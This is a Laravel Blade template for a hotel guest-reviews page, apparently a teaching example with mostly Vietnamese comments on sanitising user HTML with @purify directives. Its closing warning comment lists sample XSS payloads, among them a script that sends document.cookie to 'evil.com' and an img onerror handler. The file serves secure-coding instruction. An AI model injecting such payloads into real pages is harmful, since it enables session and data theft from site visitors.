{{-- 
  HTML Purifier Usage Examples in Blade Templates
  
  SAFE: Dùng @purify() để render user-generated HTML content
  DANGEROUS: Dùng {!! $html !!} mà không purify
--}}

@extends('layouts.app')

@section('content')
<div class="reviews-container">
    <h1>Guest Reviews</h1>

    @forelse($reviews as $review)
        <div class="review-card">
            {{-- 
              SAFE: Title được purify trước khi render
              Chỉ cho phép: <b>, <i>, <strong>, <em>
              Block: <script>, <img>, <iframe>, on*, javascript:
            --}}
            <h2>
                @purify($review->title)
            </h2>

            {{-- 
              SAFE: Content được purify + HTML-safe
              User có thể ghi: "Check out this <b>amazing</b> room!"
              Nhưng không thể: "<script>alert('XSS')</script>"
            --}}
            <div class="review-content">
                @purify($review->content)
            </div>

            {{-- 
              SAFE: Guest name cũng purified
              Không có XSS risk
            --}}
            <p class="reviewer-name">
                Reviewed by <strong>@purify($review->guest_name)</strong>
            </p>

            {{-- 
              SAFE: Rating là integer, no XSS risk
            --}}
            <div class="rating">
                @for($i = 0; $i < $review->rating; $i++)
                    ⭐
                @endfor
            </div>

            <time class="review-date">
                {{ $review->created_at->format('M d, Y') }}
            </time>
        </div>
    @empty
        <p>No reviews yet.</p>
    @endforelse
</div>

{{-- 
  EXAMPLE: Using plaintext purify (strip all HTML)
  Nếu user không được phép dùng HTML:
--}}
<section class="comments">
    <h2>Comments (plain text only)</h2>
    @foreach($comments as $comment)
        <div class="comment">
            {{-- 
              @purifyPlain strips all HTML tags
              Input: "Hello <script>alert('xss')</script> world!"
              Output: "Hello  world!"
            --}}
            <p>@purifyPlain($comment->text)</p>
            <small>by {{ $comment->author }}</small>
        </div>
    @endforeach
</section>

{{-- 
  DANGEROUS: DON'T DO THIS!
  
  ❌ {!! $review->content !!}  
  
  If content wasn't purified, user could inject:
  - <script>fetch('http://evil.com/steal?cookies=' + document.cookie)</script>
  - <img src=x onerror="stealData()">
  - etc.
  
  ALWAYS purify before rendering!
--}}

@endsection
